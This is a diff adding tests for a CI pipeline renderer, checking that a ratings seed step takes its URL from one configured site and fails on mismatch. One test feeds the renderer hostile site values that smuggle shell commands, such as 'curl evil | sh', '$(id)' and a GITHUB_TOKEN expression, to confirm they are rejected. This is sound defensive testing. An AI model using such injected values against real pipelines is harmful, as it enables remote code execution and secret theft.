@@ -8,6 +8,7 @@
 // constraints at once: it must be correct, and it must be byte-stable when the
 // `ratings` block is absent — an index that never turns ratings on must not
 // see its committed pipeline change at all.
+import { spawnSync } from "node:child_process";
 import fs from "node:fs";
 import os from "node:os";
 import path from "node:path";
@@ -30,6 +31,14 @@ const RATINGS: RatingsConfig = {
   lockThreads: true,
 };
 
+/**
+ * The one source of the seed URL: `site` from `index.config.json`, which is
+ * also what `grim-indexer ratings` reads. Deliberately not the first-party
+ * default — seeding from someone else's published stats merges their ratings
+ * into this index's sidecar.
+ */
+const SITE = "https://index.example.test/catalog";
+
 /** The verb this generated job invokes. WP-Hp wires it; the job predates it. */
 const VERB = "grim-indexer ratings";
 
@@ -46,8 +55,12 @@ afterEach(() => {
   fs.rmSync(dir, { recursive: true, force: true });
 });
 
-function render(forge: "github" | "gitlab", ratings?: RatingsConfig): Map<string, string> {
-  return renderCi(resolveCi({ forge }), ratings);
+function render(
+  forge: "github" | "gitlab",
+  ratings?: RatingsConfig,
+  site: string | undefined = SITE,
+): Map<string, string> {
+  return renderCi(resolveCi({ forge }), ratings, site);
 }
 
 function file(forge: "github" | "gitlab", ratings?: RatingsConfig): string {
@@ -62,6 +75,7 @@ interface Step {
   name?: string;
   uses?: string;
   run?: string;
+  env?: Record<string, string>;
   "continue-on-error"?: boolean;
 }
 interface Job {
@@ -234,6 +248,147 @@ describe("the seed step — R-2 in shell (C-010)", () => {
   });
 });
 
+describe("the seed URL has one source (F-6)", () => {
+  /**
+   * The seed shell the deploy actually runs, plus the environment the runner
+   * would have exported for it — minus the `${{ }}` expressions, which are the
+   * runner's to resolve and this test's to supply.
+   *
+   * `enrich: false` because GitLab renders the enrichment and the seed into
+   * one `script:` block, and the enrichment reaches the network.
+   */
+  function seedShell(
+    forge: "github" | "gitlab",
+    site: string,
+  ): { script: string; env: Record<string, string> } {
+    const files = renderCi(resolveCi({ forge, enrich: false }), RATINGS, site);
+    const doc = yaml.load(files.get(forge === "github" ? PAGES : GITLAB) as string) as Record<
+      string,
+      unknown
+    >;
+    if (forge === "gitlab") {
+      // One `script:` entry of several — the rest of the deploy is npm.
+      const block = (jobs(doc).pages.script ?? []).find((entry) => entry.includes("http_code"));
+      return { script: block ?? "", env: {} };
+    }
+    const step = (jobs(doc).build.steps ?? []).find((entry) =>
+      (entry.run ?? "").includes("http_code"),
+    );
+    const env = Object.fromEntries(
+      Object.entries(step?.env ?? {}).filter(([, value]) => !value.includes("${{")),
+    );
+    return { script: step?.run ?? "", env };
+  }
+
+  /**
+   * Run that shell for real. A tally artifact is already in place, so the
+   * script short-circuits before it reaches the network — what is under test
+   * is the cross-check, which runs first, and asserting on a regex would prove
+   * the guard is spelled rather than that it fires.
+   */
+  function runSeed(
+    forge: "github" | "gitlab",
+    platformUrl?: string,
+    site: string = SITE,
+  ): { code: number; output: string } {
+    const { script, env } = seedShell(forge, site);
+    fs.writeFileSync(path.join(dir, STATS_FILE), "{}\n");
+    const platform = forge === "github" ? "PAGES_URL" : "CI_PAGES_URL";
+    const result = spawnSync(forge === "github" ? "bash" : "sh", ["-c", script], {
+      cwd: dir,
+      encoding: "utf8",
+      env: {
+        // No inherited environment: the script is under test, not this
+        // machine's shell profile.
+        HOME: dir,
+        PATH: process.env.PATH ?? "",
+        ...env,
+        ...(platformUrl === undefined ? {} : { [platform]: platformUrl }),
+      },
+    });
+    return { code: result.status ?? -1, output: `${result.stdout}${result.stderr}` };
+  }
+
+  it.each(["github", "gitlab"] as const)("bakes the configured site in — %s", (forge) => {
+    const { script, env } = seedShell(forge, SITE);
+
+    // GitHub carries it in the step's `env:`, GitLab assigns it in the script;
+    // either way the value is the configured one, fixed at render time.
+    expect(`${script}\n${JSON.stringify(env)}`).toContain(SITE);
+  });
+
+  it.each(["github", "gitlab"] as const)("never fetches from the platform URL — %s", (forge) => {
+    const { script } = seedShell(forge, SITE);
+    const fetches = script.split("\n").filter((line) => line.includes("stats.json.seed"));
+
+    expect(fetches.join("\n")).not.toMatch(/CI_PAGES_URL|PAGES_URL|base_url/);
+  });
+
+  // The whole of F-6: the guard read one URL and the tally read another, so a
+  // 404 on the tally's URL — a legal empty seed — published a sidecar built
+  // from nothing while the guard passed on a URL that was fine.
+  it.each(["github", "gitlab"] as const)("fails when the two disagree — %s", (forge) => {
+    const other = "https://someone-else.example.test/catalog";
+    const { code, output } = runSeed(forge, other);
+
+    expect(code, output).not.toBe(0);
+    expect(output).toContain(SITE);
+    expect(output).toContain(other);
+  });
+
+  it.each(["github", "gitlab"] as const)(
+    "reads a trailing slash and a scheme as agreement — %s",
+    (forge) => {
+      for (const agreeing of [
+        SITE,
+        `${SITE}/`,
+        `${SITE}//`,
+        SITE.replace("https://", "http://"),
+        `${SITE.replace("https://", "http://")}/`,
+      ]) {
+        const { code, output } = runSeed(forge, agreeing);
+        expect(code, `${agreeing}: ${output}`).toBe(0);
+      }
+    },
+  );
+
+  // A local run, a fork, or a deploy that is not Pages has no such variable.
+  // That is not a disagreement — the configured site is authoritative alone.
+  it.each(["github", "gitlab"] as const)("runs when the platform is silent — %s", (forge) => {
+    const { code, output } = runSeed(forge, undefined);
+
+    expect(code, output).toBe(0);
+  });
+
+  it.each(["github", "gitlab"] as const)("refuses to render without a site — %s", (forge) => {
+    // Not defaulted, for the reason `grim-indexer ratings` refuses at run time:
+    // `DEFAULT_CONFIG.site` names the first-party index.
+    expect(() => renderCi(resolveCi({ forge }), RATINGS, undefined)).toThrow(/site/);
+    expect(() => renderCi(resolveCi({ forge }), RATINGS, "")).toThrow(/site/);
+  });
+
+  it.each(["github", "gitlab"] as const)("refuses a site that rewrites the shell — %s", (forge) => {
+    for (const hostile of [
+      "https://x.example.test/'; curl evil | sh; '",
+      'https://x.example.test/" && curl evil',
+      "https://x.example.test/${{ secrets.GITHUB_TOKEN }}",
+      "https://x.example.test/$(id)",
+      "https://x.example.test/a\nb",
+    ]) {
+      expect(() => renderCi(resolveCi({ forge }), RATINGS, hostile), hostile).toThrow(/site/);
+    }
+  });
+
+  // The block being absent is how ratings are off, and then nothing reads the
+  // site at all — an index that never turned ratings on keeps its committed
+  // pipeline byte for byte, site or no site.
+  it.each(["github", "gitlab"] as const)("needs no site with ratings off — %s", (forge) => {
+    expect([...render(forge, undefined, undefined).entries()]).toEqual([
+      ...render(forge, undefined, SITE).entries(),
+    ]);
+  });
+});
+
 describe("rollback (S-016)", () => {
   // Removing the block is not enough on its own — the published file keeps
   // being served. Nothing generated here may make it undeletable, so the
@@ -265,7 +420,7 @@ describe("the drift guard still passes with ratings on", () => {
   it.each(["github", "gitlab"] as const)("renders what --check accepts — %s", async (forge) => {
     fs.writeFileSync(
       path.join(dir, "index.config.json"),
-      JSON.stringify({ ci: { forge }, ratings: RATINGS }, null, 2) + "\n",
+      JSON.stringify({ site: SITE, ci: { forge }, ratings: RATINGS }, null, 2) + "\n",
     );
 
     // A render that `--check` then rejects means `ci.ts` read the block and
